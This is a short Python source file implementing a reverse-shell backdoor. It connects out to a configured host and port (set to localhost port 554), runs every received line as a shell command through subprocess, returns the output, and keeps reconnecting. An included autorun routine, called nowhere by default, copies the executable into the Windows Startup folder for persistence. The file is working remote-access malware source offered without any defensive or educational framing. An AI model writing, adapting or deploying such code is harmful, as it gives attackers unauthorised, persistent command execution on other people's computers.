import socket
import time
import subprocess
import threading
import os

HOST = "127.0.0.1"
PORT = 554


# noinspection StandardShellInjection
def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    try:
        os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))
    except Exception as e:
        print(e)
        

def connect(host, port):
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        ip = socket.gethostbyaddr(host)
        print(e)
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        return client
    except Exception as error:
        print("error connect", error)


# noinspection SubprocessShellMode
def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        if output != b'':
            client.send(output)
    except Exception as error:
        print("error cmd", error)


def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            print(data)
            if data == "/exit":
                client.close()
                break
            else:
                t = threading.Thread(target=cmd, args=(client, data))
                t.start()
                t.join()
    except Exception as error:
        print("Error listen", error)
        client.close()


if __name__ == "__main__":
    # autorun()
    time.sleep(2)
    while True:
        client_ = connect(HOST, PORT)
        if client_:
            listen(client_)
        else:
            print("Conexao deu erro, tentando novamente")
            time.sleep(3)
